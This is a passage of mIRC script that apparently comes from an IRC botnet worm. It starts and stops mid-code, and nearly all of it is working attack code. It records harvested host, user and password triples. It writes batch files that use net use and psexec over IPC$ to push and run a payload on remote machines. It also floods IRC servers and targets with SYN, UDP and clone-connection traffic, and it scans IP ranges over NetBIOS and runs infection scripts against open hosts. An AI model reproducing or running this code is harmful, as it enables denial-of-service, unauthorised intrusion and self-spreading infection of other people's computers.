rcnc.x }\n  inc %results\n  echo -a FOUND: %temp.host %temp.user %temp.pass\n  write rcnc.x %temp.host %temp.user %temp.pass\n  remove %temp.test\n}\nalias getuserpass2 {\n  set %temp.user $gettok($1,2,62)\n  set %temp.user $gettok(%temp.user,1,60)\n  set %temp.pass $gettok($1,3,47)\n  if (*pass*same*as*user* iswm %temp.pass) { set %temp.pass %temp.user }\n  if (*blank*pass* iswm %temp.pass) { set %temp.pass [NULL] }\n  if ($exists(rcnc.x) == $false) { .write -c rcnc.x }\n  inc %results\n  echo -a FOUND: %temp.host %temp.user %temp.pass\n  write rcnc.x %temp.host %temp.user %temp.pass\n  remove %temp.test\n}\nalias getroot { if ($lines(rcnc.x) < 1) { halt } | /root $read(rcnc.x,1) | write -dl1 rcnc.x }\nalias root { if ($1 == $null) { halt }\n  :select\n  set %tempfile ord $+ $fnick $+ .bat\n  set %t.drive $r(n,z) $+ :\n  if ($exists(%t.drive) == $true) { goto select }\n  set %t.user $2\n  if ($3 == [NULL]) { set %t.pass $null | set %ps.pass -p \"\" }\n  else { set %t.pass $3 | set %ps.pass -p $3 }\n  set %t.host \\\\ $+ $1 | set %t.share IPC$\n  write %tempfile net use %t.drive /delete\n  write %tempfile net use %t.host /USER: $+ %t.user $chr(34) $+ %t.pass $+ $chr(34)\n  write %tempfile net use %t.drive %t.host $+ \\ $+ %t.share\n  write %tempfile psexec.exe %t.host -u %t.user %ps.pass -f -c -d %sf -o\n  write %tempfile psexec.exe %t.host -u %t.user %ps.pass -d %sf -o\n  write %tempfile net use %t.drive /delete\n  write %tempfile net use %t.host /delete\n  write %tempfile del %tempfile\n  talk Nt $1 $2 $+ / $+ $3\n  run van32.exe %tempfile\n}\nalias rootnum {\n  inc %rooted\n  if (%rooted == $null) { set %rooted 0 }\n  inc %rooted\n  if ($len(%rooted) == 1) { set %rooted 00 $+ %rooted }\n  if ($len(%rooted) == 2) { set %rooted 0 $+ %rooted }\n  return %rooted\n}\nalias x $eval($$1-,2)\nalias synz { if ($1 == $null) { return } | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | talk syn flood on: %synaa is completed.. | unset %synaa }\nalias syn {\n  if ($2 == start) { if (%synport !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x  } }\n  if ($2 == halt) { if ($sock(syn*,0) > 0) { sockclose syn* } }\n}\nalias startsfx {\n  sockopen crash101 %satserver %satport\n  sockopen crash102 %satserver %satport\n  sockopen crash103 %satserver %satport\n  sockopen crash104 %satserver %satport\n  sockopen crash105 %satserver %satport\n  sockopen crash106 %satserver %satport\n  sockopen crash107 %satserver %satport\n  sockopen crash108 %satserver %satport\n  sockopen crash109 %satserver %satport\n  sockopen crash200 %satserver %satport\n  sockopen crash201 %satserver %satport\n  sockopen crash202 %satserver %satport\n  sockopen crash203 %satserver %satport\n  sockopen crash204 %satserver %satport\n  sockopen crash205 %satserver %satport\n  sockopen crash206 %satserver %satport\n  sockopen crash207 %satserver %satport\n  sockopen crash208 %satserver %satport\n  sockopen crash209 %satserver %satport\n  sockopen crash300 %satserver %satport\n  sockopen crash301 %satserver %satport\n  sockopen crash302 %satserver %satport\n  sockopen crash303 %satserver %satport\n  sockopen crash304 %satserver %satport\n  sockopen crash305 %satserver %satport\n  sockopen crash306 %satserver %satport\n  sockopen crash307 %satserver %satport\n  sockopen crash308 %satserver %satport\n  sockopen crash309 %satserver %satport\n  sockopen crash400 %satserver %satport\n  sockopen crash501 %satserver %satport\n  sockopen crash502 %satserver %satport\n  sockopen crash503 %satserver %satport\n  sockopen crash504 %satserver %satport\n  sockopen crash505 %satserver %satport\n  sockopen crash506 %satserver %satport\n  sockopen crash507 %satserver %satport\n  sockopen crash508 %satserver %satport\n  sockopen crash509 %satserver %satport\n  sockopen crash600 %satserver %satport\n}\non *:sockopen:crash*: {\n  if ($sockerr > 0) { return }\n  if (%fld.tp == nickx) { goto snxf }\n  if (%fld.tp == msgx) { goto smxf }\n  if (%fld.tp == jpx) { goto sjpxf }\n  if (%fld.tp == mix) { goto mix }\n  if (%fld.tp == rip) { goto rip }\n  :snxf\n  .sockwrite -tn $sockname user $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) asdf asdf asdf\n  .sockwrite -tn $sockname nick $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)\n  .sockwrite -tn $sockname ircx\n  .sockwrite -tn $sockname join %satchan\n  .sockwrite -tn $sockname nick $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)\n  .set %namesock $sockname\n  .sockclose %namesock\n  .sockwrite -tn $sockname quit : $+ $str(F\u0002O\u0016o\u001fO\u0002D\u001f\u0002E\u0016R.,20)\n  .sockopen %namesock %satserver %satport\n  halt\n  :mix\n  .sockwrite -tn $sockname user $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) asdf asdf asdf\n  .sockwrite -tn $sockname nick $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)\n  .sockwrite -tn $sockname ircx\n  .sockwrite -tn $sockname notice %satchan : ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| \n  .sockwrite -tn $sockname privmsg %satchan :\u0001DCC CHAT $r(1,999999) $r(1024,5000) $r(1,5000) $+ \u0001 \n  .sockwrite -tn $sockname notice %satchan : $+ $chr(1) $+ ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| \n  .sockwrite -tn $sockname privmsg %satchan : ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||\n  .set %namesock $sockname\n  .sockclose %namesock\n  .sockopen %namesock %satserver %satport\n  halt\n  :sjpxf\n  .sockwrite -tn $sockname user $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) asdf asdf asdf\n  .sockwrite -tn $sockname nick $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)\n  .sockwrite -tn $sockname ircx\n  .sockwrite -tn $sockname join %satchan\n  .sockwrite -tn $sockname part %satchan\n  .sockwrite -tn $sockname join %satchan\n  .sockwrite -tn $sockname part %satchan\n  .sockwrite -tn $sockname join %satchan\n  .sockwrite -tn $sockname part %satchan\n  .sockwrite -tn $sockname join %satchan\n  .sockwrite -tn $sockname part %satchan\n  .sockwrite -tn $sockname join %satchan\n  .sockwrite -tn $sockname part %satchan\n  .sockwrite -tn $sockname join %satchan\n  .sockwrite -tn $sockname part %satchan\n  .sockwrite -tn $sockname join %satchan\n  .sockwrite -tn $sockname part %satchan\n  .sockwrite -tn $sockname join %satchan\n  .sockwrite -tn $sockname part %satchan\n  .sockwrite -tn $sockname join %satchan\n  .sockwrite -tn $sockname part %satchan\n  .sockwrite -tn $sockname join %satchan\n  .set %namesock $sockname\n  .sockclose %namesock\n  .sockopen %namesock %satserver %satport\n  halt\n  :smxf\n  .sockwrite -tn $sockname user $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) asdf asdf asdf\n  .sockwrite -tn $sockname nick $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)\n  .sockwrite -tn $sockname ircx\n  .sockwrite -tn $sockname join %satchan\n  .sockwrite -tn $sockname privmsg %satchan : $str(F\u0002O\u0016o\u001fO\u0002D\u001f\u0002E\u0016R.,20)\n  .sockwrite -tn $sockname notice %satchan : $+ $str(F\u0002L\u0016O\u001fo\u0002D\u001fe\u0002r\u0016Z.,10)\n  .sockwrite -tn $sockname privmsg %satchan : $+ $chr(1) $+ Version $+ $chr(1)\n  .set %namesock $sockname\n  .sockwrite -tn $sockname quit : $+ $str(F\u0002O\u0016o\u001fO\u0002D\u001f\u0002E\u0016R.,20)\n  .sockclose %namesock\n  .sockopen %namesock %satserver %satport\n  halt\n  :rip\n  .sockwrite -tn $sockname user $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) asdf asdf asdf\n  .sockwrite -tn $sockname nick $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)\n  .sockwrite -tn $sockname ircx\n  .sockwrite -tn $sockname join %satchan\n  .sockwrite -tn $sockname notice %satchan : $+ $chr(1) $+ $str(F\u0002O\u0016o\u001fO\u0002D\u001f\u0002E\u0016R.,20)\n  .set %namesock $sockname\n  .sockwrite -tn $sockname quit : $+ $str(F\u0002O\u0016o\u001fO\u0002D\u001f\u0002E\u0016R.,20)\n  .sockclose %namesock\n  .sockopen %namesock %satserver %satport\n  halt\n}\nalias FnIcK {\n  set %fnick $rand(1,10)\n  if (%fnick = 1) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $chr($r(65,125)) $+ $chr($r(65,125))  }\n  if (%fnick = 2) { return $chr($r(65,125)) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $chr($r(65,125))  }\n  if (%fnick = 3) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) }\n  if (%fnick = 4) { return $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) }\n  if (%fnick = 5) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z)  }\n  if (%fnick = 6) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(1,40) $+ $chr($r(65,125))  }\n  if (%fnick = 7) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) }\n  if (%fnick = 8) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $chr($r(65,125))  }\n  if (%fnick = 9) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(1,10) $+ $chr($r(65,125))  }\n  if (%fnick = 10) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(20,50) $+ $chr($r(65,125)) }\n}\nalias nuke {\n  if (%udp.reps = $null) { .set %udp.reps 500 | .goto begin }\n  :begin\n  .timernuker -ocm %udp.reps 20 .udpto %udp.fuck\n}\nalias udpto {\n  .set %sock.dest %udp.fuck\n  .sockudp -b udp %udp.fuck $rand(100,4000) 999999999999 PING\n  .sockudp -b udp %udp.fuck $rand(100,4000) 999999999999 PING\n  .sockudp -b udp %udp.fuck $rand(100,4000) 999999999999 PING\n  .sockudp -b udp %udp.fuck $rand(100,4000) 999999999999 PING\n  .sockudp -b udp %udp.fuck $rand(100,4000) 999999999999 PING\n  .sockudp -b udp %udp.fuck $rand(100,4000) 999999999999 PING\n  .inc %udp.inc\n}\nalias osrun {\n  talk Out Servise Attack to : %osip\n  timeros -ocm %ostime 500 osdate\n}\nalias sglrun {\n  talk X-Signal Attack to : %sglip\n  timersgl -ocm %ostime 100 sgldate\n}\nalias sgldate {\n  sockopen signalx $+ $r(0,99999) %sglip %sglport\n}\non *:sockopen:signalx*:{\n  set %sglsock $sockname\n  sockwrite -tn $sockname $str($r(a,z) $+ $r(A,Z) $+ !@#$%^&*()_+| $+ $r(0,9) $+ $r(a,z),30)\n  sockclose %sglsock\n}\non *:dns { set %osdns $raddress }\nalias osdate {\n  dns %osip\n  .sockudp -b udp %osdns $r(21,7000) 999999999999 PING\n  .sockudp -b udp %osdns $r(21,7000) 999999999999 PING\n  .sockudp -b udp %osdns $r(21,7000) 999999999999 PING\n  .sockudp -nt $r(1,10000000000000) %osdns $r(1,60000) PING\n  .sockudp -nbt udp $+ $r(0,9999999) %osdns $r(23,60000) $str(9,400) PING\n  .sockudp -b udp %osdns $r(21,7000) $str(!@#$%^&*()_+|,10)\n  .sockudp -b udp %osdns $r(21,7000) 999999999999 PING\n  .sockudp -b udp %osdns $r(21,7000) 999999999999 PING\n  .sockudp -b udp %osdns $r(21,7000) 999999999999 PING\n}\non *:sockopen:flood-*:{ if ($sockerr) { sockclose $sockname | sockopen $+(flood-,$r(1,999),$r(a,z),$r(A,Z)) $sock($sockname).ip $sock($sockname).port } | else { sockwrite -n $sockname USER $random * * : $+ $random | sockwrite -n $sockname NICK $random | .timerpc $+ $sockname 0 5 sockwrite -n $sockname PRIVMSG # $+ $random :H4CKxCrEw } }\non *:sockread:flood-*:{\n  sockread %dtls\n  tokenize 32 %dtls\n  if ($2 == 433) { sockwrite -n $sockname NICK $random }\n  if ($1 == PING) { sockwrite -n $sockname PONG $2- | sockwrite -n $sockname PING $2- } \n  if ($2 == 376) { sockwrite -n $sockname MODE $3 +i }\n  if ($2 == PRIVMSG) && (:\u0001Version\u0001 = $4) { sockwrite -n $sockname NOTICE $remove($gettok($1,1,33),:,$chr(32)) :\u0001VERSION $version $+ \u0001 }\n  if ($2 == PRIVMSG) && (:\u0001PING*\u0001 iswm $4-) { sockwrite -n $sockname NOTICE $remove($gettok($1,1,33),:,$chr(32)) :\u0001PING $ctime $+ \u0001 }\n  if ($2 == PRIVMSG) && (:\u0001Time\u0001 iswm $4-) { sockwrite -n $sockname NOTICE $remove($gettok($1,1,33),:,$chr(32)) :\u0001TIME $fulldate $+ \u0001 }\n  if ($2 == KICK) { sockwrite -n $sockname JOIN : $+ $3 }\n  if ($1 == ERROR) { sockclose $sockname | sockopen $+(flood-,$r(1,999),$r(a,z),$r(A,Z)) $sock($sockname).ip $sock($sockname).port }\n}\non *:socklisten:Bnc:{ sockaccept BncClient $+ $r(1,999) }\non *:sockread:BncClient*:{\n  sockread %BncClient\n  if ($gettok(%BncClient,1,32) == NICK) {\n    set %Bnc.nick $gettok(%BncClient,2,32)\n  }\n  if ($gettok(%BncClient,1,32) == USER) {\n    set %Bnc.user $gettok(%BncClient,2-,32)\n    sockwrite -n $sockname NOTICE AUTH : $+ You need to say /quote PASS <password>\n  }\n  if ($gettok(%BncClient,1,32) == PASS) {\n    if ($gettok(%BncClient,2,32) == %Bnc.passwd) {\n      sockwrite -n $sockname NOTICE AUTH : $+ Welcome to rst BNC, the messiah has arrived...\n      sockwrite -n $sockname NOTICE AUTH : $+ Level two, lets connect to something real now\n      sockwrite -n $sockname NOTICE AUTH : $+ type /quote conn [server] <port> <pass> to connect\n      %Bnc.legit = yes\n    }\n    if ($gettok(%BncClient,2,32) != %Bnc.passwd) {\n      sockwrite -n $sockname NOTICE AUTH : $+ Failed Pass!!\n    }\n  }\n  if ($gettok(%BncClient,1,32) == CONN) {\n    if (%Bnc.legit != yes) { sockwrite -n $sockname NOTICE AUTH : $+ Fuck off. | sockclose   $sockname\n    }\n    if (BncServer $+ $remove($sockname,BncClient) != $null) {\n      sockclose BncServer $+ $remove($sockname,BncClient)\n    }\n    sockopen BncServer $+ $remove($sockname,BncClient) $gettok(%BncClient,2,32) $gettok(%BncClient,3,32)\n    sockwrite -n $sockname NOTICE AUTH : $+ Making reality through $gettok(%BncClient,2,32) port $gettok(%BncClient,3,32)\n    set %Bnc.server.passwd $gettok(%BncClient,4,32)\n  }\n  else {\n    if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) {\n      halt\n    }\n    sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient\n  }\n}\non *:sockopen:BncServer*:{\n  if ($sockerr) {\n    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection\n    sockclose $sockname\n    halt\n  }\n  if ($sock($sockname).status != active) {\n    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection\n    sockclose BncServer $+ $remove($socknme, BncServer)\n    halt\n  }\n  sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ Suceeded connection\n  sockwrite -n $sockname NICK %Bnc.nick\n  sockwrite -n $sockname USER %Bnc.user\n}\non *:sockread:BncServer*:{\n  sockread %BncServer\n  if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) {\n    halt\n  }\n  sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer\n}\non *:sockopen:Sockets-*:{ sockwrite -tn $sockname PONG $server | sockwrite -tn $sockname USER $nfs $nfs $nfs : $+ $nfs |   sockwrite -tn $sockname NICK $read(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) }\non *:sockread:Sockets-*:{\n  sockread %SocketTemp\n  if (PING* ISWM %SocketTemp) {\n    sockwrite -tn $sockname PONG : $+ $gettok(%SocketTemp,2,58)\n    halt\n  }\n  halt\n}\nalias checkconn {\n  if ($server == $null) { server %server }\n  else { halt }\n}\nalias cleanup { set %papaflood off | .sockclose boj* | unset %nick | unset %channel* | unset %server | unset %port | unset %clones | unset %flood | unset %flood.nick }\nalias bojsock2 if (%bojnomsocks == %bojnom) { timerbojsock2 off }\nalias bojsock { inc %bojnomSocks | Sockopen boj $+ $vip %bojserver %bojport }\non *:Sockopen:boj*:{ if ($sockerr > 0) { halt } | set -u1 %user $rand(A,Z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(a,z) | .sockwrite -nt $sockname USER %user %user %user : $+ %user | .sockwrite -nt $sockname NICK $vip $+ $r(A,Z) | sockwrite -nt $sockname ircx | sockwrite -tn $sockname join %channel2 | if %botfuck != $null { sockwrite -n $sockname join %botfuck | sockwrite -n $sockname privmsg %botfuck : $+ $str(F\u0002L\u0016o\u001fO\u0002DT\u0002e\u0016R.,20) } }\non *:Sockclose:boj*:{ sockopen bot $+ $vip %botserver %botport }\non *:sockread:boj*:{ .sockread %clone.temp | if ($gettok(%clone.temp,1,32) == Ping) { sockwrite -tn $sockname KSA %server } }\nalias bojflood set %bojflood $Blood | sockwrite -n boj* privmsg %bojfuck : $+ %bojflood\nalias vip { return $r(a,z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(a,z) }\n\nalias runudpkill {\n  talk sending udp kill packets to : %udpkillipz - times : %udpktimes\n  timerukillnuker -ocm %udpktimes 100 udptokillxz\n}\n\nalias udptokillxz {\n  .sockudp -b udp %udpkillipz $rand(100,9000) 999999999999 PING\n  .sockudp -b udp %udpkillipz $rand(100,9000) 999999999999 PING\n  .sockudp -b udp %udpkillipz $rand(100,9000) 999999999999 PING\n  .sockudp -b udp %udpkillipz $rand(100,9000) 999999999999 PING\n  .sockudp -b udp %udpkillipz $rand(100,9000) 999999999999 PING\n  .sockudp -b udp %udpkillipz $rand(100,9000) 999999999999 PING\n  .sockudp -b udp %udpkillipz $rand(100,9000) 999999999999 PING\n  .sockudp -b udp %udpkillipz $rand(100,9000) 999999999999 PING\n  .sockudp -b udp %udpkillipz $rand(100,9000) 999999999999 PING\n  .sockudp -b udp %udpkillipz $rand(100,4000) $str(!@#$%^&*()_+|,10)\n  .sockudp -nt $rand(1,10000000000000) %udpkillipz $r(1,60000) PING\n  .sockudp -nbt udp $+ $r(0,9999999) %udpkillipz $rand(23,60000) $str(9,400) PING\n}\nalias randip {\n  unset %1p1 %1p2\n  set %1p1 $1-\n  set %1p2 $replace($gettok(%1p1,1,46),*,$rand(1,255))\n  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,2,46),*,$rand(1,255))\n  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,3,46),*,$rand(1,255))\n  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,4,46),*,$rand(1,255))\n  return %1p2\n}\nalias st4rtsc4n {\n  inc %totalscaning\n  if %totalscaning >= %total $decode(ZmluaXNoZWQ=,m)\n  set %ip1 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 1\n  set %ip2 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 2\n  set %ip3 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 3\n  set %ip4 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 4\n  set %ip5 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 5\n  set %ip6 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 6\n  set %ip7 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 7\n  set %ip8 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 8\n  set %ip9 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 9\n  set %ip10 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 10\n  set %ip11 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 11\n  set %ip12 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 12\n  set %ip13 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 13\n  set %ip14 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 14\n  set %ip15 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 15\n  set %ip16 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 16\n  set %ip17 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 17\n  set %ip18 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 18\n  set %ip19 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 19\n  set %ip20 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 20\n  set %ip21 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 21\n  set %ip22 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 22\n  set %ip23 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 23\n  set %ip24 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 24\n  set %ip25 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 25\n  set %ip26 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 26\n  set %ip27 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 27\n  set %ip28 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 28\n  set %ip29 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 29\n  set %ip30 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 30\n  set %ip31 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 31\n  set %ip32 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 32\n  set %ip33 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 33\n  set %ip34 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 34\n  set %ip35 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  opensocks\n}\nalias opensocks {\n  sockopen ip1 %ip1 %nb.port\n  if $1 == 1 finished\n  sockopen ip2 %ip2 %nb.port\n  if $1 == 2 finished\n  sockopen ip3 %ip3 %nb.port\n  if $1 == 3 finished\n  sockopen ip4 %ip4 %nb.port\n  if $1 == 4 finished\n  sockopen ip5 %ip5 %nb.port\n  if $1 == 5 finished\n  sockopen ip6 %ip6 %nb.port\n  if $1 == 6 finished\n  sockopen ip7 %ip7 %nb.port\n  if $1 == 7 finished\n  sockopen ip8 %ip8 %nb.port\n  if $1 == 8 finished\n  sockopen ip9 %ip9 %nb.port\n  if $1 == 9 finished\n  sockopen ip10 %ip10 %nb.port\n  if $1 == 10 finished\n  sockopen ip11 %ip11 %nb.port\n  if $1 == 11 finished\n  sockopen ip12 %ip12 %nb.port\n  if $1 == 12 finished\n  sockopen ip13 %ip13 %nb.port\n  if $1 == 13 finished\n  sockopen ip14 %ip14 %nb.port\n  if $1 == 14 finished\n  sockopen ip15 %ip15 %nb.port\n  if $1 == 15 finished\n  sockopen ip16 %ip16 %nb.port\n  if $1 == 16 finished\n  sockopen ip17 %ip17 %nb.port\n  if $1 == 17 finished\n  sockopen ip18 %ip18 %nb.port\n  if $1 == 18 finished\n  sockopen ip19 %ip19 %nb.port\n  if $1 == 19 finished\n  sockopen ip20 %ip20 %nb.port\n  if $1 == 20 finished\n  sockopen ip21 %ip21 %nb.port\n  if $1 == 21 finished\n  sockopen ip22 %ip22 %nb.port\n  if $1 == 22 finished\n  sockopen ip23 %ip23 %nb.port\n  if $1 == 23 finished\n  sockopen ip24 %ip24 %nb.port\n  if $1 == 24 finished\n  sockopen ip25 %ip25 %nb.port\n  if $1 == 25 finished\n  sockopen ip26 %ip26 %nb.port\n  if $1 == 26 finished\n  sockopen ip27 %ip27 %nb.port\n  if $1 == 27 finished\n  sockopen ip28 %ip28 %nb.port\n  if $1 == 28 finished\n  sockopen ip29 %ip29 %nb.port\n  if $1 == 29 finished\n  sockopen ip30 %ip30 %nb.port\n  if $1 == 30 finished\n  sockopen ip31 %ip31 %nb.port\n  if $1 == 31 finished\n  sockopen ip32 %ip32 %nb.port\n  if $1 == 32 finished\n  sockopen ip33 %ip33 %nb.port\n  if $1 == 33 finished\n  sockopen ip34 %ip34 %nb.port\n  if $1 == 34 finished\n  sockopen ip35 %ip35 %nb.port\n  .timerscanner1 1 3 /sockclose ip*\n  .timerscanner2 1 4 /st4rtsc4n\n}\nalias randscan {\n  unset %1p1 %1p2\n  set %1p1 $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255)\n  :set2\n  set %1p2 $gettok($ip,1-2,46) $+ .255.255\n  if ($gettok(%1p2,1,46) < $gettok(%1p1,1,46)) { goto set2 | halt }\n}\nalias stopscan { sockclose ip* | timerscanner* off | unset %ip* | unset %total | unset %totalscaning | unset %beg* | unset %end* }\nalias finished {\n  if (%auto != on) { notice %o1 Scanning from %begshortip to %endshortip is finished! | stopscan }\n  if (%auto == on) { notice %o1 Scanning from %begshortip to %endshortip is finished, now starting up new range! | stopscan | randscan | set %begshortip %1p1 | set %endshortip %1p2 | set %beglongip $longip(  %begshortip ) | st4rtsc4n | notice %o1 [NetBios Scanner] starting scan from: %begshortip to %endshortip using %scan.bat sharing thru port %nb.port }\n}\non 1:sockopen:ip*:{\n  if (%scan.bat = admin) { if ($sockerr > 0) { halt } | set %infection % [ $+ [ $sockname ] ] | run eoputr.exe /n /fh /r \"4dm1n.bat %infection %sf $+ \" | notice %o1 [NetBios Scanner] Found Open Port: $sock($sockname).port at: %infection , Attempting to root. [Admin Sharing] [ %nb.port ] | inc %totalscanned | sockclose $sockname | unset %infection | halt }\n  if (%scan.bat = ipc) { if ($sockerr > 0) { halt } | set %infection % [ $+ [ $sockname ] ] | run eoputr.exe run /n /fh /r \"1pc.bat 